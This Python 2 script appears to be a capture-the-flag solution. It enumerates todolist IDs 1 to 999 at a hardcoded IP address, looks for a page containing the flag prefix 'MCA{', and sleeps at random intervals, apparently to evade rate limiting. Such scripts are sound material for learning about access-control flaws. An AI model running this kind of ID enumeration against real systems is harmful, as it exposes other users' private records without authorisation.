import time
import random
import os
import urllib2

target_url = "http://138.247.13.110/todolist/{}/"

for i in range (1, 1000):

   try:
      # Call web page.
      url = target_url.format(str(i))
      print "[*] Calling web page '{}'.".format(url)
      req = urllib2.Request(url)
      page = urllib2.urlopen(req)
      content = page.read()
      
      # Flag found.
      if "MCA{" in content:
         print content
         break
   
   except urllib2.HTTPError as err:
      print "[*] Response > {}".format(err.code)

   # Go to sleep.
   sleep_interval = random.randint(1, 4)
   print "[*] Sleeping {} secs.".format(sleep_interval)
   time.sleep(sleep_interval)
